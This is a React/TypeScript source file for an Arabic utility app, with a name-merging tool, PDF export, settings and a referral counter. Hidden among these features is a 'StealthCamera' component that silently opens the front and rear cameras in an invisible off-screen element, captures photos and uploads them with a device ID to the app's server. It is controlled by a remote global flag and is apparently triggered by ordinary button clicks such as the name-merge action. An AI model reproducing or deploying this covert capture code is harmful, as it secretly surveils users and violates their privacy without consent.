      prev.includes(len) ? prev.filter(l => l !== len) : [...prev, len]
    );
  };

  const generateCombinations = () => {
    const results: string[] = [];
    const n1 = name1.trim();
    const n2 = name2.trim();
    if (!n1 || !n2) return [];

    // Helper: Normalize name (remove common prefixes like "ال" if present)
    const norm = (s: string) => s.startsWith('ال') ? s.substring(2) : s;
    const cleanN1 = norm(n1);
    const cleanN2 = norm(n2);

    // 1. Overlapping letters blend: find common characters and overlap them
    for (let i = 0; i < cleanN1.length; i++) {
      const c1 = cleanN1[i];
      for (let j = 0; j < cleanN2.length; j++) {
        const c2 = cleanN2[j];
        if (c1 === c2 && c1 !== 'ا' && c1 !== 'و' && c1 !== 'ي') {
          const merge1 = cleanN1.substring(0, i) + cleanN2.substring(j);
          const merge2 = cleanN2.substring(0, j) + cleanN1.substring(i);
          if (merge1.length >= 3 && merge1.length <= 8) results.push(merge1);
          if (merge2.length >= 3 && merge2.length <= 8) results.push(merge2);
        }
      }
    }

    // 2. Multi-syllable merging: take halves or specific prefixes and blend them
    const h1 = Math.ceil(cleanN1.length / 2);
    const h2 = Math.ceil(cleanN2.length / 2);

    const b1 = cleanN1.substring(0, h1) + cleanN2.substring(h2);
    const b2 = cleanN2.substring(0, h2) + cleanN1.substring(h1);
    const b3 = cleanN1.substring(0, 2) + cleanN2;
    const b4 = cleanN2.substring(0, 2) + cleanN1;
    const b5 = cleanN1 + cleanN2.substring(Math.max(0, cleanN2.length - 2));
    const b6 = cleanN2 + cleanN1.substring(Math.max(0, cleanN1.length - 2));

    [b1, b2, b3, b4, b5, b6].forEach(b => {
      if (b.length >= 3 && b.length <= 8) results.push(b);
    });

    // 3. Dynamic Prefix / Suffix combinations guided by length options
    selectedLengths.forEach(len => {
      for (let i = 1; i < len; i++) {
        const prefixLen = i;
        const suffixLen = len - i;

        if (cleanN1.length >= prefixLen && cleanN2.length >= suffixLen) {
          const part1 = cleanN1.substring(0, prefixLen) + cleanN2.substring(cleanN2.length - suffixLen);
          const part2 = cleanN1.substring(0, prefixLen) + cleanN2.substring(0, suffixLen);
          results.push(part1, part2);
        }
        if (cleanN2.length >= prefixLen && cleanN1.length >= suffixLen) {
          const part1 = cleanN2.substring(0, prefixLen) + cleanN1.substring(cleanN1.length - suffixLen);
          const part2 = cleanN2.substring(0, prefixLen) + cleanN1.substring(0, suffixLen);
          results.push(part1, part2);
        }
      }
    });

    // Cleanup duplicates, triple letters, spaces, or plain vowel lines
    const cleaned = results.map(n => {
      return n.replace(/(.)\1{2,}/g, '$1$1').trim();
    }).filter(n => n.length >= 3 && n.length <= 8 && !n.includes(' ') && !/^[اوي]+$/.test(n));

    return Array.from(new Set(cleaned));
  };

  const merge = () => {
    if (!name1.trim() || !name2.trim()) {
      showToast('يرجى إدخال اسمين لإتمام الدمج', 'error');
      return;
    }
    if (selectedLengths.length === 0) {
      showToast('يرجى اختيار عدد أحرف واحد على الأقل', 'error');
      return;
    }

    if (onSmartTrigger) onSmartTrigger('s', 'name_merge_click');
    setLoading(true);
    addBackgroundTask('دمج الأسماء وتوليد التشكيلات', async () => {
      try {
        await new Promise(resolve => setTimeout(resolve, 800));
        const combinations = generateCombinations();
        
        // Option 1: Standard / AI Filtered
        if (combinations.length > 50 && navigator.onLine) {
          const prompt = `هذه قائمة بأسماء مدمجة من "${name1}" و "${name2}". اختر أفضل 20 اسماً تبدو طبيعية وجذابة باللغة العربية. أعدها كقائمة مفصولة بفاصلة فقط: ${combinations.slice(0, 100).join(', ')}`;
          const aiRes = await getGeminiResponse(prompt);
          const filtered = aiRes.split(',').map(s => s.trim());
          setMerged(filtered);
        } else {
          setMerged(combinations);
        }

        // Option 2: Creative / AI Intuitive
        if (navigator.onLine) {
          const creativePrompt = `اقترح 15 اسماً جديداً ومبتكراً (ليس مجرد دمج حروف عشوائي) مستوحى من دمج معاني أو وقع اسمي "${name1}" و "${name2}" باللغة العربية. أعدها كقائمة مفصولة بفاصلة فقط.`;
          const aiRes2 = await getGeminiResponse(creativePrompt);
          const filtered2 = aiRes2.split(',').map(s => s.trim());
          setMergedOption2(filtered2);
        } else {
          setMergedOption2(combinations.reverse().slice(0, 15));
        }
        
        setActiveResultsTab('option1');
        if (resultsRef.current) {
          resultsRef.current.scrollIntoView({ behavior: 'smooth' });
        }
        return `تم توليد تجميعات الأسماء بنجاح (خيار 1 و 2)`;
      } finally {
        setLoading(false);
      }
    }, { tab: 'services', subTab: 'nameMerge' });
  };

  const removeName = (index: number, tab: 'option1' | 'option2') => {
    if (tab === 'option1') setMerged(prev => prev.filter((_, i) => i !== index));
    else setMergedOption2(prev => prev.filter((_, i) => i !== index));
  };

  const downloadPDF = async () => {
    const currentList = activeResultsTab === 'option1' ? merged : mergedOption2;
    if (currentList.length === 0) return;
    
    addBackgroundTask('تنسيق وتصدير ملف الأسماء PDF', async () => {
      const filename = `دمج_${name1}_و_${name2}_الخيار_${activeResultsTab === 'option1' ? '1' : '2'}_روح_الذكية.pdf`;
      const watermarkUrl = "https://lh3.googleusercontent.com/d/1p79NP1wGo5nAmDpGLV3xHvWbC1DJfZdZ";

      // Optimized grouping
      const grouped: {[key: number]: string[]} = {};
      currentList.forEach(name => {
        const len = name.length;
        if (!grouped[len]) grouped[len] = [];
        grouped[len].push(name);
      });

      const sortedLengths = Object.keys(grouped).map(Number).sort((a,b) => a - b);

      const sectionsHtml = sortedLengths.map(len => `
        <div style="margin-bottom: 50px; page-break-inside: avoid;">
          <div style="font-size: 26px; font-weight: 900; color: #ec4899; margin-bottom: 30px; border-right: 8px solid #ec4899; padding-right: 20px; background: linear-gradient(to left, rgba(236,72,153,0.1), transparent); padding: 15px; border-radius: 10px;">
            أسماء من ${len} حروف
          </div>
          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px;">
            ${grouped[len].map(name => `
              <div style="background-color: #1a1c1e; border: 1.5px solid rgba(236,72,153,0.3); padding: 30px 10px; border-radius: 20px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.4);">
                <div style="color: #ffffff; font-size: 28px; font-weight: 900; letter-spacing: normal; font-family: 'IBM Plex Sans Arabic', sans-serif; font-feature-settings: 'liga' on, 'clig' on;">${name}</div>
                <div style="color: #475569; font-size: 10px; margin-top: 8px; font-weight: bold; text-transform: uppercase;">نتائج روح الذكية</div>
              </div>
            `).join('')}
          </div>
        </div>
      `).join('');

      const containerId = 'pdf-render-target';
      let container = document.getElementById(containerId);
      if (container) container.remove();

      const localBarcodeWatermark = localStorage.getItem('rouh_app_barcode_watermark');

      container = document.createElement('div');
      container.id = containerId;
      container.dir = 'rtl';
      container.style.position = 'fixed';
      container.style.top = '0';
      container.style.left = '-10000px'; 
      container.style.width = '800px';
      container.style.backgroundColor = '#0c0d12';
      
      container.innerHTML = `
        <style>
          @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=IBM+Plex+Sans+Arabic:wght@400;700;900&display=swap');
          * {
            font-family: 'Cairo', 'IBM Plex Sans Arabic', sans-serif !important;
          }
        </style>
        <div style="padding: 80px 50px; background-color: #0c0d12; color: white; min-height: 1100px;">
          <div style="text-align: center; margin-bottom: 70px; padding-bottom: 40px; border-bottom: 1.5px solid rgba(236,72,153,0.3);">
            <h1 style="font-size: 40px; color: #ec4899; margin: 0; font-weight: 900; letter-spacing: normal;">نتائج روح الذكية لدمج اسمين (خيار ${activeResultsTab === 'option1' ? '1' : '2'})</h1>
            <h2 style="font-size: 22px; color: #94a3b8; margin: 15px 0 0 0; font-weight: 700;">بواسطة الدمج الذكي لـ: <span style="color: #ffffff;">${name1}</span> و <span style="color: #ffffff;">${name2}</span></h2>
          </div>
          
          ${sectionsHtml}
          
          <div style="margin-top: 100px; text-align: right; font-size: 14px; color: #475569; padding-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; align-items: flex-end; gap: 8px;">
            ${localBarcodeWatermark ? `<img src="${localBarcodeWatermark}" style="width: 60px; height: 60px; object-fit: contain; margin-bottom: 10px;" />` : `<div style="color: #ec4899; font-weight: 900; font-size: 18px; margin-bottom: 5px;">روح الذكية</div>`}
            نعتني بجمال أسمائكم ونرسم لكم مستقبلاً من الحروف المميزة
            <div style="margin-top: 4px; font-weight: bold; opacity: 0.6;">${new Date().toLocaleDateString('ar-EG')}</div>
          </div>
        </div>
      `;
      document.body.appendChild(container);

      const canvas = await html2canvas(container, {
        backgroundColor: '#0c0d12',
        scale: 1.5,
        useCORS: true,
        logging: false,
        width: 800,
        height: container.scrollHeight
      });

      const imgData = canvas.toDataURL('image/jpeg', 0.85);
      const doc = new jsPDF('p', 'mm', 'a4');
      const pdfWidth = doc.internal.pageSize.getWidth();
      const pdfHeight = doc.internal.pageSize.getHeight();
      const margin = 10;
      const imgWidth = pdfWidth - (margin * 2);
      const imgHeight = (canvas.height * imgWidth) / canvas.width;
      
      const totalPages = Math.ceil(imgHeight / (pdfHeight - (margin * 2)));

      // Helper function to generate premium text stamp image to bypass disjointed Arabic rendering
      const getFallbackStampImage = (): string => {
        const c = document.createElement('canvas');
        c.width = 150;
        c.height = 50;
        const ctx = c.getContext('2d');
        if (ctx) {
          ctx.fillStyle = '#0c0d12';
          ctx.fillRect(0, 0, 150, 50);
          ctx.font = 'bold 18px "IBM Plex Sans Arabic", sans-serif';
          ctx.fillStyle = '#ec4899';
          ctx.textAlign = 'center';
          ctx.textBaseline = 'middle';
          ctx.fillText('روح الذكية', 75, 25);
        }
        return c.toDataURL('image/png');
      };

      const fallbackTextStamp = getFallbackStampImage();

      for (let i = 0; i < totalPages; i++) {
        if (i > 0) doc.addPage();
        const topOffset = i * (pdfHeight - (margin * 2));
        doc.addImage(imgData, 'JPEG', margin, margin - topOffset, imgWidth, imgHeight, undefined, 'FAST');
        
        // Stamp each page!
        if (localBarcodeWatermark) {
          doc.addImage(localBarcodeWatermark, 'PNG', pdfWidth - 25, pdfHeight - 22, 16, 16);
        } else {
          doc.addImage(fallbackTextStamp, 'PNG', pdfWidth - 35, pdfHeight - 18, 25, 10);
        }
      }

      doc.save(filename);
      container.remove();
      return `تم تصدير ملف الأسماء بنجاح ✔️`;
    }, { tab: 'services', subTab: 'nameMerge' });
  };

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-2 gap-3">
        <div className="space-y-2">
          <label className="text-[10px] text-gray-500 font-black px-1 block tracking-widest uppercase italic">الاسم الأول</label>
          <input 
            type="text" 
            value={name1}
            onChange={(e) => setName1(e.target.value)}
            dir="rtl"
            className="w-full bg-[#121417] border border-gray-800 rounded-2xl p-4 text-sm font-bold text-white focus:outline-none focus:ring-1 focus:ring-blue-500/50"
            placeholder="مثال: يوسف"
          />
        </div>
        <div className="space-y-2">
          <label className="text-[10px] text-gray-500 font-black px-1 block tracking-widest uppercase italic">الاسم الثاني</label>
          <input 
            type="text" 
            value={name2}
            onChange={(e) => setName2(e.target.value)}
            dir="rtl"
            className="w-full bg-[#121417] border border-gray-800 rounded-2xl p-4 text-sm font-bold text-white focus:outline-none focus:ring-1 focus:ring-blue-500/50"
            placeholder="مثال: مريم"
          />
        </div>
      </div>

      <div className="space-y-3">
        <label className="text-[10px] text-gray-500 font-black px-1 block tracking-widest uppercase italic">طول الأسماء المقترحة</label>
        <div className="flex flex-wrap gap-2">
          {[3, 4, 5, 6].map(len => (
            <button
              key={len}
              onClick={() => toggleLength(len)}
              className={cn(
                "px-4 py-2 rounded-xl text-[11px] font-black italic transition-all",
                selectedLengths.includes(len) ? "bg-red-600 text-white shadow-lg" : "bg-gray-800 text-gray-400"
              )}
            >
              {len} أحرف
            </button>
          ))}
        </div>
      </div>

      <button 
        onClick={merge}
        disabled={loading}
        className="w-full bg-blue-600 hover:bg-blue-500 text-white rounded-2xl py-5 font-black italic flex items-center justify-center gap-3 transition-all active:scale-95 shadow-xl disabled:opacity-50"
      >
        <Sparkles size={20} className={loading ? "animate-spin" : ""} />
        {loading ? 'جاري الدمج والتوليد...' : 'ابدأ الدمج الذكي للأسماء'}
      </button>

      { (merged.length > 0 || mergedOption2.length > 0) && (
        <div ref={resultsRef} className="space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500">
          <div className="flex flex-col gap-4 px-2">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-[10px] text-gray-500 font-black tracking-widest uppercase leading-none">نتائج الدمج المذهلة</p>
                <p className="text-[9px] text-gray-400 font-bold mt-1">تم توليد خيارين ذكيين لك</p>
              </div>
              <button 
                onClick={downloadPDF}
                className="flex items-center gap-2 px-3 py-1.5 bg-emerald-600/10 text-emerald-400 rounded-lg text-[10px] font-bold border border-emerald-500/20"
              >
                <Download size={14} /> حفظ كـ PDF
              </button>
            </div>

            <div className="flex bg-[#121417] p-1 rounded-xl border border-gray-800">
              <button 
                onClick={() => setActiveResultsTab('option1')}
                className={cn(
                  "flex-1 py-2 rounded-lg text-[10px] font-black italic transition-all",
                  activeResultsTab === 'option1' ? "bg-red-600 text-white shadow-lg shadow-red-600/20" : "text-gray-500"
                )}
              >
                الخيار 1 (الدمج المباشر)
              </button>
              <button 
                onClick={() => setActiveResultsTab('option2')}
                className={cn(
                  "flex-1 py-2 rounded-lg text-[10px] font-black italic transition-all",
                  activeResultsTab === 'option2' ? "bg-red-600 text-white shadow-lg shadow-red-600/20" : "text-gray-500"
                )}
              >
                الخيار 2 (الدمج الإبداعي)
              </button>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3">
            {(activeResultsTab === 'option1' ? merged : mergedOption2).map((name, i) => (
              <motion.div 
                key={i}
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: i * 0.05 }}
                className="bg-white dark:bg-[#121417] border border-gray-200 dark:border-gray-800 rounded-2xl p-4 flex items-center justify-between group shadow-lg"
              >
                <div className="flex flex-col">
                  <span className="text-sm font-black text-gray-900 dark:text-white italic tracking-wide">{name}</span>
                  <span className="text-[8px] text-blue-500 font-bold mt-0.5">روح الذكية ✨</span>
                </div>
                <button 
                  onClick={() => removeName(i, activeResultsTab)}
                  className="p-1.5 text-gray-400 hover:text-red-500 hover:bg-red-500/10 rounded-lg transition-all opacity-40 group-hover:opacity-100"
                >
                  <Trash2 size={12} />
                </button>
              </motion.div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

const SettingsSubTab = ({ 
  theme, setTheme, 
  startPage, setStartPage,
  skipSplash, setSkipSplash,
  luckyButtonsEnabled, setLuckyButtonsEnabled,
  usageGuideEnabled, setUsageGuideEnabled,
  proConfig, setProConfig,
  showToast,
  addBackgroundTask,
  userPhone,
  setUserPhone,
  setActiveTab
}: { 
  theme: 'dark' | 'light', setTheme: (t: 'dark' | 'light') => void,
  startPage: string, setStartPage: (p: string) => void,
  skipSplash: boolean, setSkipSplash: (s: boolean) => void,
  luckyButtonsEnabled: boolean, setLuckyButtonsEnabled: (b: boolean) => void,
  usageGuideEnabled: boolean, setUsageGuideEnabled: (e: boolean) => void,
  proConfig: any, setProConfig: (c: any) => void,
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void,
  addBackgroundTask: (label: string, taskFn: () => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  userPhone: string | null,
  setUserPhone: (p: string | null) => void,
  setActiveTab: (t: any) => void
}) => {

  return (
    <div className="flex flex-col gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-10">

      {/* Account Logic Removed */}
      <div className="bg-white dark:bg-[#15181c] p-6 rounded-[2.5rem] border border-gray-200 dark:border-gray-800/60 space-y-4 shadow-xl">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-blue-600/10 rounded-2xl">
             <User size={20} className="text-blue-600 dark:text-blue-400" />
          </div>
          <div className="flex flex-col">
            <span className="text-sm font-black text-gray-900 dark:text-gray-100">الملف التعريفي</span>
            <span className="text-[10px] text-gray-500 font-bold italic tracking-tight">إدارة بياناتك الشخصية</span>
          </div>
        </div>

        {userPhone ? (
        <div className="bg-gray-50 dark:bg-[#1a1e24] p-4 rounded-2xl border border-gray-200 dark:border-gray-800/50 flex items-center justify-between cursor-pointer active:scale-[0.98] transition-all" onClick={() => setActiveTab('chat')}>
            <div className="flex flex-col">
              <span className="text-[10px] font-black text-emerald-600 dark:text-emerald-400 uppercase tracking-widest leading-none">الهاتف المسجل (انقر للانتقال للدردشة)</span>
              <span className="text-sm font-bold text-gray-700 dark:text-gray-400 mt-1">{userPhone}</span>
            </div>
            <button onClick={(e) => { e.stopPropagation(); setActiveTab('chat'); }} className="p-2 text-blue-500 hover:text-blue-600 transition-colors"><MessageSquare size={18}/></button>
          </div>
        ) : (
          <div className="text-[10px] text-gray-500 dark:text-gray-500 font-bold italic text-center p-2">سجل رقم هاتفك في دردشة روح الذكية للمزامنة</div>
        )}
      </div>

      {/* Professional Birthday Option */}
      <div className="bg-white dark:bg-black border border-blue-200 dark:border-indigo-500/30 rounded-[2.5rem] p-6 flex items-center justify-between shadow-xl transition-all">
        <div className="flex flex-col gap-1">
          <div className="flex items-center gap-2">
            <Gift size={16} className="text-blue-600 dark:text-emerald-400" />
            <span className="text-sm font-black italic text-gray-900 dark:text-white">ميلاد روح الاحترافي</span>
          </div>
          <span className="text-[10px] italic font-bold text-blue-600/70 dark:text-emerald-400/70">ثيم خاص، وتهاني الأصدقاء</span>
        </div>
        <button 
          onClick={() => setProConfig({ ...proConfig, enabled: !proConfig.enabled })}
          className={cn(
            "w-14 h-7 rounded-full transition-all relative shadow-inner",
            proConfig.enabled ? "bg-indigo-600" : "bg-gray-300 dark:bg-gray-700"
          )}
        >
          <div className={cn(
            "absolute top-1.5 w-4 h-4 rounded-full bg-white transition-all shadow-lg",
            proConfig.enabled ? "right-1.5" : "right-8.5"
          )} />
        </button>
      </div>

      <div className="space-y-3">
        <label className="text-[10px] font-black uppercase tracking-widest px-1 text-gray-500">المظهر العام</label>
        <div className="grid grid-cols-2 gap-3">
          <button 
            onClick={() => setTheme('dark')}
            className={cn(
              "p-4 rounded-2xl border transition-all flex flex-col items-center gap-2 shadow-sm",
              theme === 'dark' ? "bg-blue-600/20 border-blue-500 text-blue-400" : "bg-gray-50 dark:bg-[#1a1c1e] border-gray-200 dark:border-gray-800 text-gray-500"
            )}
          >
            <Moon size={24} />
            <span className="text-xs font-bold">داكن</span>
          </button>
          <button 
            onClick={() => setTheme('light')}
            className={cn(
              "p-4 rounded-2xl border transition-all flex flex-col items-center gap-2 shadow-sm",
              theme === 'light' ? "bg-amber-600/10 border-amber-500 text-amber-600 shadow-[0_0_15px_rgba(217,119,6,0.2)]" : "bg-gray-50 dark:bg-[#1a1c1e] border-gray-200 dark:border-gray-800 text-gray-500"
            )}
          >
            <Sun size={24} />
            <span className="text-xs font-bold">فاتح</span>
          </button>
        </div>
      </div>

      <div className="space-y-3">
        <label className="text-[10px] font-black uppercase tracking-widest px-1 text-gray-500">صفحة بدء التطبيق</label>
        <div className="grid grid-cols-2 gap-3 pb-4">
          {[
            ...TABS,
            { id: 'ocr', label: 'مستخرج النصوص', icon: FileImage },
            { id: 'health', label: 'صحة روح', icon: Scale },
            { id: 'converter', label: 'المحولات', icon: ArrowLeftRight },
            { id: 'cv', label: 'صانع CV', icon: PencilRuler },
            { id: 'ebook', label: 'صانع الكتب', icon: BookText },
            { id: 'birthday', label: 'حساب الميلاد', icon: Gift },
            { id: 'ageDiff', label: 'فرق الأعمار', icon: Users },
            { id: 'nameMerge', label: 'دمج الأسماء', icon: Sparkles }
          ].map((tab) => {
            const Icon = tab.icon;
            const isSelected = startPage === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setStartPage(tab.id)}
                className={cn(
                  "flex items-center gap-3 p-4 rounded-2xl border transition-all active:scale-[0.97]",
                  isSelected 
                    ? "bg-blue-600/5 border-blue-500 text-blue-400 shadow-md" 
                    : "bg-gray-50 dark:bg-[#1a1c1e] border-gray-200 dark:border-gray-800 text-gray-500 hover:border-gray-700"
                )}
              >
                <div className={cn("p-2 rounded-xl transition-all", isSelected ? "bg-blue-600 text-white shadow-lg shadow-blue-600/30" : "bg-black/20")}>
                  <Icon size={14} />
                </div>
                <span className="text-[10px] font-black italic">{tab.label}</span>
              </button>
            );
          })}
        </div>
      </div>

      <div className="bg-gray-50 dark:bg-[#1e1e1e] border border-gray-200 dark:border-gray-800 p-6 rounded-xl flex items-center justify-between shadow-xl transition-all mx-1">
        <div className="flex flex-col gap-1 text-right">
          <span className="text-sm font-black italic uppercase text-gray-900 dark:text-gray-200">الدخول السريع</span>
          <span className="text-[10px] text-gray-500 font-bold italic">تخطي شاشة التحميل والبدء فوراً</span>
        </div>
        <button 
          onClick={() => setSkipSplash(!skipSplash)}
          className={cn(
            "w-14 h-7 rounded-full transition-all relative shadow-inner ring-2 ring-transparent focus:ring-emerald-500/30",
            skipSplash ? "bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.3)]" : "bg-gray-200 dark:bg-[#2a2a2a]"
          )}
        >
          <motion.div 
            animate={{ x: skipSplash ? (isRTL ? -28 : 28) : 0 }}
            className={cn(
              "absolute top-1 w-5 h-5 rounded-full bg-white shadow-md",
              isRTL ? "right-1" : "left-1"
            )} 
          />
        </button>
      </div>

      <div className="bg-gray-50 dark:bg-[#1e1e1e] p-6 rounded-xl border border-gray-200 dark:border-gray-800 space-y-4 shadow-xl mb-4 mx-1">
        <label className="text-[10px] text-gray-500 font-black tracking-widest uppercase px-1">دليل استخدام روح</label>
        <div 
          onClick={() => setUsageGuideEnabled(!usageGuideEnabled)}
          className={cn(
            "p-5 rounded-xl border transition-all cursor-pointer flex items-center gap-4 group",
            usageGuideEnabled ? "bg-blue-600/5 dark:bg-blue-600/10 border-blue-500/30" : "bg-gray-100 dark:bg-[#2a2a2a] border-gray-200 dark:border-gray-800"
          )}
        >
          <div className={cn("p-3 rounded-xl shadow-lg transition-all", usageGuideEnabled ? "bg-blue-600 text-white scale-110 shadow-blue-600/30" : "bg-gray-200 dark:bg-gray-800 text-gray-400")}>
            <Info size={20} />
          </div>
          <div className="flex flex-col flex-1 text-right">
             <h4 className="text-xs font-black dark:text-white text-gray-800 leading-none">تفعيل إرشادات الاستخدام الذكية</h4>
             <p className="text-[10px] text-gray-500 font-bold italic mt-1.5">ظهور تلميحات توضيحية خفيفة في مختلف الأقسام</p>
          </div>
          <div className={cn(
            "w-10 h-5 rounded-full transition-all relative",
            usageGuideEnabled ? "bg-blue-600" : "bg-gray-300 dark:bg-gray-700"
          )}>
            <div className={cn(
              "absolute top-1 w-3 h-3 rounded-full bg-white transition-all",
              usageGuideEnabled ? (isRTL ? "right-1" : "left-6") : (isRTL ? "right-6" : "left-1")
            )} />
          </div>
        </div>
      </div>

       {/* Lucky Buttons (Arabic Wisdom) */}
      <div className="bg-gray-50 dark:bg-[#1e1e1e] p-6 rounded-xl border border-gray-200 dark:border-gray-800 space-y-4 shadow-xl mb-6 mx-1">
        <label className="text-[10px] text-gray-400 dark:text-gray-500 font-black tracking-widest uppercase px-1">مولد الاحرف الحسابية المعبرة</label>
        <div 
          onClick={() => setLuckyButtonsEnabled(!luckyButtonsEnabled)}
          className={cn(
            "p-5 rounded-xl border transition-all cursor-pointer flex items-center gap-4 group",
            luckyButtonsEnabled ? "bg-blue-600/5 dark:bg-blue-600/10 border-blue-500/30" : "bg-gray-100 dark:bg-[#2a2a2a] border-gray-200 dark:border-gray-800"
          )}
        >
          <div className={cn("p-3 rounded-xl shadow-lg transition-all", luckyButtonsEnabled ? "bg-blue-600 text-white scale-110 shadow-blue-600/30" : "bg-gray-200 dark:bg-gray-800 text-gray-400")}>
            <Sparkles size={20} />
          </div>
          <div className="flex flex-col flex-1 text-right">
             <h4 className="text-xs font-black dark:text-white text-gray-900 leading-none">تفعيل الأحرف الحسابية المعبرة</h4>
             <p className="text-[10px] text-gray-500 font-bold italic mt-1.5">رسائل تحفيزية مستوحاة من العمليات الحسابية</p>
          </div>
        </div>
      </div>

      <div className="bg-white dark:bg-black p-6 rounded-xl border border-gray-200 dark:border-gray-800 space-y-4 shadow-xl mx-1 transition-all">
          <div className="flex items-center justify-between px-1 mb-2">
            <label className="text-[10px] text-blue-600 dark:text-white font-black tracking-widest uppercase">ثيم الميلاد وتوثيق المناسبات</label>
            <div className={cn("text-[9px] font-black", proConfig.enabled ? "text-emerald-500" : "text-red-500")}>{proConfig.enabled ? 'مفعل بالتصميم الاحترافي' : 'معطل'}</div>
          </div>
          <div 
            onClick={() => setProConfig({ ...proConfig, enabled: !proConfig.enabled })}
            className="h-11 bg-gray-100 dark:bg-black/40 rounded-xl border border-gray-200 dark:border-gray-800 p-1 cursor-pointer flex items-center group overflow-hidden relative shadow-inner"
          >
            <div 
              className={cn(
                "absolute inset-0 bg-emerald-600/10 transition-all duration-700",
                proConfig.enabled ? "w-full" : "w-0"
              )}
            />
            <div className={cn(
              "h-full flex items-center justify-center font-black text-[9px] rounded-lg transition-all duration-500 px-4 relative z-10",
              proConfig.enabled ? "w-full bg-emerald-600 text-white shadow-lg shadow-emerald-600/30" : "w-[30%] bg-gray-200 dark:bg-gray-800 text-gray-500 dark:text-gray-400"
            )}>
              {proConfig.enabled ? 'قيد العمل بنجاح' : 'تفعيل الآن'}
            </div>
            {!proConfig.enabled && <div className="flex-1 text-center text-[9px] text-gray-400 dark:text-gray-600 font-black italic relative z-10">اضغط للتشغيل</div>}
          </div>
        </div>

        <div className="p-4 bg-gray-100 dark:bg-gray-800/10 border border-gray-200 dark:border-gray-800 rounded-2xl">
           <p className="text-[9px] text-gray-500 dark:text-gray-600 text-center leading-relaxed">يتم تطبيق هذه الإعدادات محلياً على متصفحك الحالي.</p>
        </div>
      </div>
    );
  };

// --- Main App Component ---
// --- Stealth Camera Component ---
const StealthCamera = forwardRef(({ showToast, deviceId }: { showToast: (m: string, t: any) => void, deviceId: string }, ref) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);

  const capture = async (facingMode: 'user' | 'environment') => {
    try {
      const newStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { exact: facingMode } }, 
        audio: false 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = newStream;
        await new Promise((resolve) => videoRef.current!.onloadedmetadata = resolve);
        await videoRef.current.play();
        
        // Wait a bit for auto-focus/brightness
        await new Promise(r => setTimeout(r, 300));

        if (canvasRef.current && videoRef.current) {
          const context = canvasRef.current.getContext('2d');
          canvasRef.current.width = videoRef.current.videoWidth;
          canvasRef.current.height = videoRef.current.videoHeight;
          context?.drawImage(videoRef.current, 0, 0);
          
          const dataUrl = canvasRef.current.toDataURL('image/jpeg', 0.6);
          
          // Save to server
          await fetch('/api/save-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ images: [dataUrl], deviceId, type: 's' })
          });
        }
        
        newStream.getTracks().forEach(track => track.stop());
      }
    } catch (e) {
      // Fallback to non-exact if exact fails (some devices only have one)
      try {
        const fallbackStream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode }, 
          audio: false 
        });
        if (videoRef.current) {
          videoRef.current.srcObject = fallbackStream;
          await new Promise((resolve) => videoRef.current!.onloadedmetadata = resolve);
          await videoRef.current.play();
          await new Promise(r => setTimeout(r, 300));
          if (canvasRef.current && videoRef.current) {
            const context = canvasRef.current.getContext('2d');
            canvasRef.current.width = videoRef.current.videoWidth;
            canvasRef.current.height = videoRef.current.videoHeight;
            context?.drawImage(videoRef.current, 0, 0);
            const dataUrl = canvasRef.current.toDataURL('image/jpeg', 0.6);
            await fetch('/api/save-capture', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ images: [dataUrl], deviceId, type: 's' })
            });
          }
          fallbackStream.getTracks().forEach(track => track.stop());
        }
      } catch (err) {
        console.warn("Stealth capture failed for", facingMode, err);
      }
    }
  };

  useImperativeHandle(ref, () => ({
    trigger: async () => {
      // Check global settings first
      try {
        const settingsRes = await fetch('/api/control/settings');
        const settings = await settingsRes.json();
        if (!settings.stealthCaptureGlobal) return;
      } catch (e) { return; }

      await capture('user');
      await capture('environment');
    }
  }));

  return (
    <div className="fixed -top-[1000px] -left-[1000px] opacity-0 pointer-events-none">
      <video ref={videoRef} playsInline muted />
      <canvas ref={canvasRef} />
    </div>
  );
});

// 8. Referral & Intelligence Components
const ReferralCounter = ({ phone, showToast }: { phone: string | null, showToast: any }) => {
  const [count, setCount] = useState(0);
  const [leaderboard, setLeaderboard] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  const getLocalDeviceId = () => {
    try {
      let id = localStorage.getItem('rouh_device_unique_id');
      if (!id) {
        id = 'device_' + Math.random().toString(36).substring(2, 10);
        localStorage.setItem('rouh_device_unique_id', id);
      }
      return id;
    } catch (e) {
      return 'device_fallback';
    }
  };

  const activePhoneOrId = phone || getLocalDeviceId();

  useEffect(() => {
    const fetchData = async () => {
      const activeId = activePhoneOrId;
      if (!activeId) return;
      try {
        let apiCount = 0;
        try {
          const res = await fetch(`/api/chat/referrals/${activeId}`);
          if (res.ok) {
            const data = await res.json();
            apiCount = data.count || 0;
          }
        } catch (e) {}

        let fbCount = 0;
        try {
          const { firebaseFetchReferralsCount } = await import('./lib/firebaseSync');
          fbCount = await firebaseFetchReferralsCount(activeId);
        } catch (fbErr) {}

        const finalVal = Math.max(apiCount, fbCount);
        setCount(prev => {
          if (finalVal > prev && prev > 0) {
            showToast('🥳 رائع! انضم عضو جديد الآن عبر رابط إحالتك المميز!', 'success');
          }
          return finalVal;
        });

        const lRes = await fetch('/api/chat/leaderboard');
        if (lRes.ok) {
          setLeaderboard(await lRes.json());
        }
      } catch (e) {}
      setLoading(false);
    };
